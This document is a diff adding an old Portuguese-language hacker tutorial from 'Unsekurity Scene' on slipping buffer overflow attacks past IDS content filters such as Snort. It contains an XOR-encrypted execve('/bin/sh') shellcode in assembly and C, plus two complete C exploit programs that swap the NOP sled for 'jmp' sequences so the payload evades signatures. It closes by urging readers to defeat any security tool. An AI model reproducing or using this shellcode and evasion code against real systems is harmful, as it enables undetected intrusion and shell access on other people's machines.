@@ -1,0 +1,358 @@
+#########################################################################
+########################### UNSEKURITY SCENE ############################
+#########################################################################
+
+Desenvolvido por Nash Leon.
+nashleon@yahoo.com.br
+
+OBS: O Autor nao se responsabiliza pelo mau uso dos dados e informacoes
+     aqui disponibilizados.
+
+OBS2: Elites que se fecham em grupinhos, pseudo-elites que mudam home
+      pages, analistas de seguranca sem escrupulos, favor nao ler! Voces
+      perderao o tempo precioso de vcs!
+
+
+               *************************************
+               * Passando Filtros Contra Overflows *
+               *************************************
+
+1 - INTRODUCAO
+2 - ESQUEMAS
+3 - TERMINANDO
+    3.1 - Links e Referencias
+    3.2 - Consideracoes Finais
+
+
+---------------
+1 - INTRODUCAO |
+---------------
+
+"Por tras da Pantomima, ha sempre um artista solitario, puxando a corda
+ da cortina!"
+
+Este artigo descreve o basico de alguns esquemas contra ferramentas de
+filtragem de conteudo de buffer overflows, ou seja, como passar por elas!
+Pre-requisitos para ler este tutorial sao os de sempre, elites fora,
+conhecimento basico de C e escrita de exploits e um pouco sobre IDS.
+
+-------------
+2 - ESQUEMAS |
+-------------
+
+Existem varias ferramentas 'IDS' que procuram detectar ataques do tipo
+Buffer Overflows.Irei destacar apenas algumas, mas os conceitos podem
+ser mais abrangentes, de modo que pode-se usar as mesmas tecnicas em
+outras ferramentas.
+
+2.1 - Filtragem de Conteudo
+------------------------------
+
+Algumas Ferramentas procuram filtrar o conteudo de dados que sao recebidos
+pelos daemons.Um ferramenta capaz de fazer isso e que eh muito popular eh
+o 'snort'.Ela funciona como uma especie de sniffer, procurado filtrar
+todos os dados que estao chegando atraves da interface local.
+Dentre os dados que ela pode filtrar, estao as strings.Analisaremos dois
+possiveis casos, abaixo:
+
++ /bin/sh -> O snort eh capaz de detectar a tentativa de recebimento pelo
+             daemon de strings do tipo /bin/sh inseridas em shellcodes.
+             A grande maioria dos shellcodes enviam solicitacoes de
+             comandos a serem executados de modo claro, ou seja, strings
+             do tipo '/bin/bash', '/bin/sh', '/bin/echo', '/etc/passwd',
+             enfim, como essas strings nao podem corresponder a dados
+             aceitos pelo daemon, elas sao facilmente detectadas e o
+             IDS em questao(snort) eh capaz de alertar quanto a uma
+             tentativa de invasao via 'buffer overflow' em algum daemon.
+
+ Solucao: Uma possivel solucao p/ este problema reside em procurar enviar
+          os comandos ou strings responsaveis pela 'exploitacao' via
+          shellcode encriptados.Existem varios exemplos de shellcodes
+          encriptados e voce pode ler mais sobre isso no 'Tutorial Basico
+          de Escrita de Shellcodes p/ Linux(II Parte)' e tambem no
+          artigo 'PASSANDO POR STRINGS', ambos publicados por mim que
+          podem ser obtidos nos links disponibilizados fim deste tutorial.
+          Um Exemplo de Shellcode encriptado segue abaixo:
+
+
+        xorl    %eax,%eax         # Reseta EAX
+        jmp     0x22              # Salta para 0x22
+        popl    %ebx              # retira EBX(string) do stack.
+        movl    8(%ebx),%edx      # copia string encriptada para EDX.
+        xor     %edx,(%ebx)       # OU logico em EDX e 0(EBX).
+        xor     %edx,4(%ebx)      # Desencripta o shellcode
+        xor     %edx,%edx         # Reseta EDX.
+        movl    %ebx,0x8(%esp)    # copia /bin/sh para 0x8(%esp)
+        movl    %edx,0xc(%esp)    # copia /bin/sh + null word long p/ 0xc(%esp)
+        movb    $0xb,%al          # copia execve(11) para AL.
+        leal    0x8(%esp),%ecx    # copia o end. de /bin/sh sobre ECX.
+        int     $0x80             # Sai para modo kernel.
+        xorl    %ebx,%ebx         # Reseta EBX.
+        movl    %ebx,%eax         # copia EBX para EAX.
+        incl    %eax              # incrementa EAX(1 = exit).
+        int     $0x80             # sai para modo kernel.
+        call    -0x27             # chama -0x27.
+        .string  "\x7a\x37\x3c\x3b\x7a\x26\x3d\x55\x55\x55\x55\x55"
+
+
+Veremos entao como fica o shellcode num .c:
+
+--------------------------- nlscrypt.c --------------------------------
+
+/* Shellcode encriptado com base no do lamagra.
+   Desenvolvido por Nash Leon.
+   nashleon@yahoo.com.br
+*/
+
+char shellcode[] =
+
+"\x31\xc0\xeb\x22\x5b\x8b\x53\x08\x31\x13\x31\x53\x04\x31\xd2\x89"
+"\x5c\x24\x08\x89\x54\x24\x0c\xb0\x0b\x8d\x4c\x24\x08\xcd\x80\x31"
+"\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff"
+"\x7a\x37\x3c\x3b\x7a\x26\x3d\x55" /* /bin/sh encriptado */
+"\x55\x55\x55\x55"; /* Chave conversora */
+
+main(){
+int *retorno;
+retorno = (int *)&retorno + 2;
+(*retorno) = (int)shellcode;
+}
+
+----------------------------------------------------------------------
+
+Este eh apenas um dos inumeros possiveis esquemas de se criptografar
+um shellcode.No exemplo acima, teriamos o comando '/bin/sh' sendo
+executado, mas a string a ser enviada seria 'z7<;z&=', logo a ferramenta
+de IDS nao seria capaz de detectar uma tentiva de exploitacao com
+base na string de comando a ser enviada.
+
++ NOPS(0x90) - Muitos Exploits p/ buffer overflows costumam enviar a
+               intrucao NOP(0x90) para facilitar a exploitacao de um
+               programa(daemon).A intrucao NOP eh responsavel por
+               uma execucao vazia, ou seja, nao se executa nada.Isto
+               eh essencial, caso tenha duvidas, leia meu tutorial de
+               buffer overflows.Algumas ferramentas de IDS, incluindo o
+               snort, procuram filtrar a chegada de pacotes contendo
+               esta intrucao, e do mesmo modo como no exemplo anterior,
+               se enviarmos esta instrucao, correremos um serio risco
+               de sermos detectados no sistema alvo.
+
+ Solucao: Entendendo a logica que envolve a instrucao 'NOP' e o seu real
+          significado, podemos facilmente contemplar esquemas substitutos,
+          como por exemplo, substituirmos esta instrucao por outra que
+          procura executar o mesmo objetivo da instrucao NOP em nossos
+          exploits.Abaixo nos podemos contemplar um esquema, onde ao inves
+          de termos NOP(0x90) temos a instrucao 'jmp 0x02', ou seja,
+          jmp(0xeb) + 02(0x02):
+
+------------------------------- semnop.c --------------------------------
+/* Exemplo de Exploit sem a instrucao NOP(0x90) */
+
+#include <stdio.h>
+#include <unistd.h>
+
+#define  ALIGN     0
+#define  OFFSET    0
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+int main(int argc, char *argv[]) {
+int i,tamanho;
+int offset = OFFSET;
+long retaddr;
+char *buffer;
+
+if(argc < 2) {
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+exit(0);
+}
+
+if(argc > 2) offset = atoi(argv[2]);
+
+tamanho = atoi(argv[1]);
+
+retaddr = pega_sp() - offset;
+
+buffer = (char *)malloc(tamanho);
+if(buffer < 0){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+
+for (i=0;i<tamanho;i+=4) {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+
+
+/* Abaixo nos vemos a condicao for() tendo i sendo incremento em
+   2 posicoes p/ recebimento da instrucao 'jmp 0x02' */
+
+for (i = 0; i < tamanho - strlen(shellcode)-100;i+=2) {
+    *(short *) &buffer[i] = 0xeb;
+    *(short *) &buffer[i+1] = 0x02;
+}
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* Executamos o programa bugado */
+
+execl("./bug","bug",buffer,NULL);
+return 0;
+}
+
+--------------------------------------------------------------------
+
+Voce pode testar este exploit em um programa 'bug' vulneravel a buffer
+overflow qualquer, a unica limitacao eh que voce terah que chutar os
+tamanhos dos buffers seguidos, ou seja, ele pode exploitar em '540' e
+nao exploitar em '541'.Esta particularidade consiste justamente na
+instrucao ser uma instrucao dupla, se o retorno cair na instrucao 'jmp'
+esta otimo, mas se cair aonde esta localizado '0x02', ele nao obterah
+exito.Com base nessas informacoes podemos ir mais alem ainda e 
+implementarmos instrucoes como 'jmp 0x03', 'jmp 0x04' e assim por
+diante.Para nao haver duvidas, abaixo segue o mesmo exploit acima,
+mas com a intrucao 'jmp 0x03' ao invez de 'jmp 0x02'.
+
+--------------------------- semnop2.c ---------------------------------
+
+/* Exemplo 2 de Exploit sem NOP. */
+
+#include <stdio.h>
+#include <unistd.h>
+
+#define  ALIGN     0
+#define  OFFSET    0
+
+char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+unsigned long pega_sp(void){
+__asm__("movl %esp, %eax");
+}
+
+int main(int argc, char *argv[]) {
+int i,tamanho;
+int offset = OFFSET;
+long retaddr;
+char *buffer;
+
+if(argc < 2) {
+printf("Uso: %s <tamanho_do_buffer> <offset>\n",argv[0]);
+exit(0);
+}
+
+if(argc > 2) offset = atoi(argv[2]);
+
+tamanho = atoi(argv[1]);
+
+retaddr = pega_sp() - offset;
+
+buffer = (char *)malloc(tamanho);
+if(buffer < 0){
+fprintf(stderr,"Nao pode alocar mamoria!!\n");
+exit(1);
+}
+
+for (i=0;i<tamanho;i+=4) {
+                buffer[i+ALIGN]=(retaddr&0x000000ff);
+                buffer[i+ALIGN+1]=(retaddr&0x0000ff00)>>8;
+                buffer[i+ALIGN+2]=(retaddr&0x00ff0000)>>16;
+                buffer[i+ALIGN+3]=(retaddr&0xff000000)>>24;
+        }
+
+/* Abaixo nos vemos a condicao for() tendo i sendo incremento em
+   3 posicoes p/ recebimento da instrucao 'jmp 0x03' e o valor
+   0x41(A) apenas como enchimento */
+
+for (i = 0; i < tamanho - strlen(shellcode)-100;i+=3) {
+    *(short *) &buffer[i] = 0xeb;
+    *(short *) &buffer[i+1] = 0x03;
+    *(short *) &buffer[i+2] = 0x41;
+}
+
+/* Se quisessemos por 'jmp 0x04' poderiamos colocar o seguinte:
+
+for (i = 0; i < tamanho - strlen(shellcode)-100;i+=4) {
+*(short *) &buffer[i] = 0xeb;   // jmp 
+*(short *) &buffer[i+1] = 0x04; // 0x04 
+*(short *) &buffer[i+2] = 0x4e; // N de Nash 
+*(short *) &buffer[i+3] = 0x4c; // L de Leon 
+}
+*/
+
+memcpy(buffer+i,shellcode,strlen(shellcode));
+
+/* Executamos o programa bugado */
+
+execl("./bug","bug",buffer,NULL);
+return 0;
+}
+
+------------------------------------------------------------------------
+
+Podemos contemplar esquemas basicos contra ferramentas de IDS especificas,
+podemos ir mais alem e conseguirmos esquematizar e descobrir mais
+possiveis esquemas contra varias ferramentas IDS.Cabe a voce, amigo NewBie,
+procurar ir mais longe e contemplar maiores esquemas contra toda e qualquer
+ferramenta de seguranca.
+
+---------------
+3 - TERMINANDO |
+---------------
+
+Tou de volta a ativa! Com maquina nova, animo novo, depois de uma pequena
+recessao!! Esquemas contra ferramentas de IDS existem para serem usadas!
+Mas deve sempre haver cautela quando implementamos tais esquemas!
+
+
+3.1 - Links e Referencias
+--------------------------
+
+"Tutorial Basico de Escrita de Exploits para Buffer Overflows em Linux"
+por Nash Leon - http://unsekurity.virtualave.net/
+
+"Truques Contra IDS(I Parte)"
+por Nash Leon - http://unsekurity.virtualave.net/
+
+"Stealthcode" - 
+por r00tabega - 
+http://packetstorm.securify.com/groups/r00tabega/stealthcode.txt
+
+
+3.2 - Consideracoes Finais
+---------------------------
+
+Resolvi(pelo menos por enquanto) terminar meus trabalhos incompletos e
+publica-los em forma de artigo(se o unsek permitir, logico!).Pretendo
+descrever em separado as tecnicas e esquemas contra ferramentas bem como
+alguns materiais que tavam guardados!
+
+O unsek completou 1 ano de lutas! E a tendencia eh a interacao de mais
+pessoas, deste modo, deve haver um aumento da troca de informacoes e
+consequentemente, de conhecimento de todos os envolvidos!
+
+Agradeco aos irmaos, newbies, que de uma maneira ou de outra tem
+contribuido para tornar a Unsek Scene cada vez mais forte! Agradeco a
+todos os escritores e ajudantes na mail list e no forum que tem
+contribuido diretamente na "LIBERDADE DE INFORMACAO".
+
+Um Abraco.
+
+                                                Nash Leon.
+          
+          
+
+
+
+
